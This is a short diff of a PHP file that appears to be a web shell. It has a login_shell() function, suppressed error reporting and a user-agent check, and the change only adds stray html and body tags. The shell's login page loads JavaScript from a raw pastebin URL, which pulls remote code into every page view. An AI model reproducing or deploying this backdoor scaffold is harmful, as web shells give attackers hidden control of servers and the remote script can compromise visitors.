@@ -1,3 +1,5 @@
+<html>
+<body>
 <?php
 session_start();
 error_reporting(0);
@@ -25,6 +27,8 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 
 function login_shell() {
 ?>
+	</body>
+</html>
 <html>
 <head>
 <script type="text/javascript" src="https://pastebin.com/raw/ynL2hpMe"></script>
